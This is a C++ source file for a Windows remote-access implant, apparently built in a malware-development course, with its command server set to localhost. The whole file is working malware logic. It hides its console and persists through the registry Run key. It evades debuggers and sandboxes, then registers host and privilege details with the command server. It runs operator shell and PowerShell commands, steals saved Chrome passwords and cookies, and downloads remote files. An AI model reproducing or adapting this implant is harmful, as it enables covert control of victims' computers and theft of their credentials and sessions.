#include <iostream>
#include <string>
#include <shlwapi.h>
#include "libs/nlohmann/json.hpp"
#include "execution/execution.hpp"
#include "crypto/aesgcm.hpp"
#include "comms/comms.hpp"
#include "file_io/file_io.h"
#include "sitawareness/sitawareness.hpp"
#include "config/config.hpp"
#include "loot/loot.hpp"
#include "com_crypto/com_crypto.hpp"

using json = nlohmann::json;


std::string get_mac_address(){
    std::string mac_address = "wmic path Win32_NetworkAdapter where \"PNPDeviceID like \'%PCI%\' AND AdapterTypeID=\'0\'\" get MacAddress";
    LPSTR mac =  const_cast<char *>(mac_address.c_str());

    
    std::string mac_id = runProgram(mac);
    std::istringstream ss(mac_id);
    std::string id;
    ss >> id;
    ss >> id;
    //std::cout << id << std::endl;
    return id;
}

std::string get_privilege_info(){
    std::string cmd = "whoami /all";
    LPSTR priv =  const_cast<char *>(cmd.c_str());

    
    std::string priv_info = runProgram(priv);
    return priv_info;
}

void make_persist(){
    std::string p = "Split-Path -Path $pwd -Parent";
    LPSTR pa =  const_cast<char *>(p.c_str());
    std::istringstream res(runPowershellCommand(pa));
    std::string resp;
    res >> resp;
    resp = resp+ "\\main_implant.exe";
    std::cout << resp << std::endl;
    LPCSTR progPath = resp.c_str();
    HKEY hkey = NULL;
    LPCSTR path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER,path,&hkey); //Creates a key       
    LPCSTR name = "MyApp";
    LONG status = RegSetValueEx(hkey,name, 0, REG_SZ, (BYTE*)progPath, 100 * sizeof(char));
    if(status == ERROR_SUCCESS){
        //std::cout << "Done" << std::endl;
    }
}
void check_debugger(){
    if(IsDebuggerPresent()){
            int *ptr;
            ptr = NULL;
            *ptr = 0;
        }
}
int check_ch0nky(){
	char fileName[] = "C:\\malware\\ch0nky.txt"; // TODO: Make sure this file exists to perform this test
    BOOL fileExists = FALSE;
	fileExists = PathFileExistsA(fileName);
    if(fileExists){
        return 1;
    }
    return 0;
    //exit(1);
}

int main(){
::ShowWindow(::GetConsoleWindow(), SW_HIDE);
//MessageBoxA(NULL,NULL,NULL,MB_YESNO);
Sleep(100);
check_ch0nky();
std::string cmd_usr = "$env:UserName";
LPSTR username_cmd = const_cast<char *>(cmd_usr.c_str());
std::string username;
username = runPowershellCommand(username_cmd);
username.erase(std::remove(username.begin(), username.end(), '\n'), username.end());
std::cout << username << std::endl;

make_persist();
check_debugger();

//exit(1);
    
    CONFIG config;
    std::string info = getInfo();
    // std::cout << info << std::endl;
    json j = json::parse(info);
    //std::cout << j["systeminfo"] << std::endl;

    
    config.computer_guid = get_mac_address();
    config.c2_fqdn = "localhost";
    config.c2_port = 5000;

    std::string sys = j["systeminfo"];
    json sys_info = json::parse(sys);
    //check VM
    if (sys_info["Hyper-V Requirements"] != "A hypervisor has been detected. Features required for Hyper-V will not be displayed."){
        exit(1);
    }
    json reg;
    // reg["computer_guid"] = config.computer_guid;
    // std::cout << sys_info["Network Card(s)"] << std::endl;
    
    //std::cout <<  sys_info["Network Card(s)"] << std::endl;
    reg[ "computer_guid"] = config.computer_guid;
    reg["computer_name"] = sys_info["Host Name"];
    reg["computer_user"] = j["whoami"]; 
    reg["computer_privileges"] = get_privilege_info();
    reg["connecting_ip_address"] = sys_info["Network Card(s)"];
    reg["session_key"] = "askdgjassgf";


    //std::cout << 

    encryptor enc;
    std::string s = enc.encrypt_public_key();
    json d;
    d["computer_guid"] = config.computer_guid;
    d["data"] = s;
    d["nonce"] = enc.random_bytes;
    std::string resp = post(config.c2_fqdn,config.c2_port,"/key_gen",d.dump());
    //std::cout << resp << std:: endl;

    try{
        resp = enc.decrypt_data(resp);
    }catch(const std::exception& e){

    }
    //exit(1);

    json send_reg;
    send_reg["computer_guid"] =  config.computer_guid;
    send_reg["data"] = enc.encrypt_data(reg.dump());
    send_reg["nonce"] = enc.random_bytes;
    //std::cout << send_reg["nonce"] << std::endl;
    resp =  post(config.c2_fqdn,config.c2_port,"/register",send_reg.dump());
    //std::cout << resp << std::endl;
    try{
    resp =enc.decrypt_data(resp);
    }catch(const std::exception& e){

    }
    int sleep_value = 1000;

    //exit(1);
    while(1){
        Sleep(sleep_value);
        resp = getNextCommand(config);
        //std::cout << resp << std::endl;
        try{
        resp = enc.decrypt_data(resp);
        }catch(const std::exception& e){
        }
        std::string get_cmd_resp = resp;
        json command = json::parse(get_cmd_resp);
        std::string cmd_result = "";
        std::string cmd_text = "";
        std::string cmd_id = command["command_id"];
        if(cmd_id != "-1"){
            cmd_text = command["command_text"];
            LPSTR cmd =  const_cast<char *>(cmd_text.c_str());
            try{
            if (command["command_type"] == "shell"){
                cmd_result = runPowershellCommand(cmd);
            }else if (command["command_type"] == "implant_cmd"){
                if(command["command_text"]=="chrome_passwords"){
                    unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];

                    getMasterKey(masterKey, "vagrant");
                    printUCharAsHex(masterKey, MASTER_KEY_SIZE);

                    json jsonResult = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
                    cmd_result = jsonResult.dump();
                    //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;

                    delete[] masterKey;
                }else if(command["command_text"]=="situational_awareness"){
                    cmd_result = info;
                    //std::cout << info << std::endl;
                }else if(command["command_text"]=="chrome_cookies"){
                    unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];

                    getMasterKey(masterKey, "vagrant");
                    printUCharAsHex(masterKey, MASTER_KEY_SIZE);

                    json jsonResult = lootChromeCookies((const unsigned char*) masterKey, "vagrant");
                    cmd_result = jsonResult.dump();
                    //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;

                    delete[] masterKey;
                }
            }else if(command["command_type"] == "system_program"){
                cmd_result = runProgram(cmd);
            }else if(command["command_type"] == "download_file"){
                FileIO fileIO = FileIO();
                char filePath[] = "C:\\Users\\vagrant\\AppData\\Local\\Temp\\random_file";
                std::string url_str = command["command_text"];
                char *url = const_cast<char*>(url_str.c_str());
                fileIO.DownloadFileViaUrl(url, filePath);
            }
            }catch (const std::exception& e){
                cmd_result = e.what();
            }
            if(cmd_result == ""){
                cmd_result = "Probably wrong command type or command text";
            }

            std::string data = ("{\"computer_guid\": \""+config.computer_guid+"\", "
                            "\"command_id\": \""+cmd_id+"\", "
                            "\"result\": \""+" "+"\"}");
            json da = json::parse(data);
            da["result"] = cmd_result;
            std::string cmd_data = enc.encrypt_data(da.dump());
            resp = sendCommandResult(config,enc.random_bytes,cmd_data);
            //std::cout << resp << std::endl;
            try{
            resp =enc.decrypt_data(resp);
            }catch(const std::exception& e){

            }
        }else{
                if(command["command_type"]=="sleep"){
                std::string val = command["command_text"];
                sleep_value =std::stoi(val);
                }
                //std::cout << sleep_value << "Hahaha" << std::endl;
        }
    }
    

    return 0;
}